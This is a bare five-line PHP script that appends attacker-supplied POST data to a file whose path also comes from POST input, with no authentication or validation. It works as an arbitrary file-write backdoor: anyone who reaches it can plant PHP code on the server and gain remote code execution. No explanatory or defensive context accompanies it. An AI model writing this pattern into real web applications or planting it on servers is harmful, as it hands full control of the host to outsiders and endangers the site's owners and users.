<?php 
$fd = fopen ($_POST['filename'], "a");
fwrite($fd, $_POST['data']);
fclose($fd);
?>